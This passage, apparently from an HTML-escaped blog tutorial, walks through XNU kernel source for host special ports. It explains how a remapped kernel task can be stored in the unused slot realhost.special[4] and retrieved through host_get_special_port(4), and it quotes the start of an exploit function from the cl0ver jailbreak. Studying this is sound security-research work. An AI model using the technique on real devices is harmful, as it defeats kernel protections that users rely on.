    &lt;span class=&quot;mi&quot;&gt;096&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_UNFREED_PORT&lt;/span&gt;		&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_MAX_SPECIAL_KERNEL_PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;097&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_AMFID_PORT&lt;/span&gt;			&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_MAX_SPECIAL_KERNEL_PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;098&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_GSSD_PORT&lt;/span&gt;			&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_MAX_SPECIAL_KERNEL_PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;099&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_TELEMETRY_PORT&lt;/span&gt;		&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_MAX_SPECIAL_KERNEL_PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_ATM_NOTIFICATION_PORT&lt;/span&gt;	&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_MAX_SPECIAL_KERNEL_PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;101&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_COALITION_PORT&lt;/span&gt;		&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_MAX_SPECIAL_KERNEL_PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;102&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_SYSDIAGNOSE_PORT&lt;/span&gt;           &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_MAX_SPECIAL_KERNEL_PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;103&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_XPC_EXCEPTION_PORT&lt;/span&gt;		&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_MAX_SPECIAL_KERNEL_PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;104&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_CONTAINERD_PORT&lt;/span&gt;		&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_MAX_SPECIAL_KERNEL_PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;105&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_NODE_PORT&lt;/span&gt;			&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;19&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_MAX_SPECIAL_KERNEL_PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;106&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_RESOURCE_NOTIFY_PORT&lt;/span&gt;	&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_MAX_SPECIAL_KERNEL_PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;107&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_CLOSURED_PORT&lt;/span&gt;		&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_MAX_SPECIAL_KERNEL_PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;108&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_SYSPOLICYD_PORT&lt;/span&gt;		&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_MAX_SPECIAL_KERNEL_PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;109&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;110&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_MAX_SPECIAL_PORT&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;HOST_SYSPOLICYD_PORT&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;111&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;                                         &lt;span class=&quot;cm&quot;&gt;/* MAX = last since rdar://35861175 */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;112&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;113&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* obsolete name */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;114&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_CHUD_PORT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_LAUNCHCTL_PORT&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;115&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This contains a bunch of special ports, which as you might have guessed already from the comments, are used for special purposes. From the comments, it is clear that the first seven ports are reserved for the kernel itself. However, only three of them are being used so far. The &lt;strong&gt;HOST_PORT&lt;/strong&gt; provides an abstraction over the host and &lt;strong&gt;HOST_PRIV&lt;/strong&gt; is used for privileged operations, while the &lt;strong&gt;HOST_IO_MASTER_PORT&lt;/strong&gt; is used to interact with devices. Each Host special port is mentioned with a particular number, which is of quite a significance. We can note that &lt;strong&gt;#4&lt;/strong&gt; is not being used anywhere.&lt;/p&gt;

&lt;p&gt;Another thing worth mentioning is that in order to get send right to a host special port, you need to call &lt;strong&gt;host_get_special_port&lt;/strong&gt; with an &lt;strong&gt;int node&lt;/strong&gt; parameter, which is the number allocated to that special port.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;nl&quot;&gt;File:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;osfmk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kern&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1193&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/*
    1194:  *      User interface for setting a special port.
    1195:  *
    1196:  *      Only permits the user to set a user-owned special port
    1197:  *      ID, rejecting a kernel-owned special port ID.
    1198:  *
    1199:  *      A special kernel port cannot be set up using this
    1200:  *      routine; use kernel_set_special_port() instead.
    1201:  */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1202&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kern_return_t&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1203&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;host_set_special_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host_priv_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;host_priv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_port_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1204&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1205&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host_priv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_PRIV_NULL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_MAX_SPECIAL_KERNEL_PORT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_MAX_SPECIAL_PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1206&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KERN_INVALID_ARGUMENT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1207&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;1208&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CONFIG_MACF&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1209&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mac_task_check_set_host_special_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;current_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1210&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KERN_NO_ACCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1211&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endif&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1212&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;1213&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kernel_set_special_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host_priv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1214&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1215&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;1216&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/*
    1217:  *      User interface for retrieving a special port.
    1218:  *
    1219:  *      Note that there is nothing to prevent a user special
    1220:  *      port from disappearing after it has been discovered by
    1221:  *      the caller; thus, using a special port can always result
    1222:  *      in a &quot;port not valid&quot; error.
    1223:  */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1224&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;1225&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kern_return_t&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1226&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;host_get_special_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host_priv_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;host_priv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__unused&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;node&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_port_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;portp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1227&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1228&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;ipc_port_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1229&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;1230&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host_priv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_PRIV_NULL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_SECURITY_PORT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_MAX_SPECIAL_PORT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1231&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KERN_INVALID_ARGUMENT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1232&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;1233&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;host_lock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host_priv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1234&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;realhost&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;special&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1235&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;portp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_port_copy_send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1236&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;host_unlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host_priv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1237&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;1238&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KERN_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1239&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1240&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Looking at the function, we can see that it requires the &lt;strong&gt;host_priv&lt;/strong&gt; port as a parameter, and hence executing this call requires root permissions, in addition to all the sandbox checks. The &lt;strong&gt;host_get_special_port&lt;/strong&gt; function essentially gets the port value from &lt;strong&gt;realhost.special[node]&lt;/strong&gt; and returns it back to the caller.&lt;/p&gt;

&lt;p&gt;Coming back to the pointer check, if we can do a remap on the kernel task, write it to the unused port space, which is &lt;strong&gt;realhost.special[4]&lt;/strong&gt;, and then call &lt;strong&gt;host_get_special_port(4)&lt;/strong&gt;, this should give us a remapped and working kernel task.&lt;/p&gt;

&lt;p&gt;The following code snippet from &lt;strong&gt;cl0ver&lt;/strong&gt; written by &lt;a href=&quot;https://twitter.com/Siguza&quot;&gt;Siguza&lt;/a&gt; does exactly that&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;
&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;patch_host_special_port_4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;task_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kernel_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;DEBUG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Installing host_special_port(4) patch...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;addr_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;special&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offsets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;slid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data_realhost_special&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;vm_address_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kernel_task_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                     &lt;span class=&quot;n&quot;&gt;kernel_self_port_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                     &lt;span class=&quot;n&quot;&gt;old_port_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
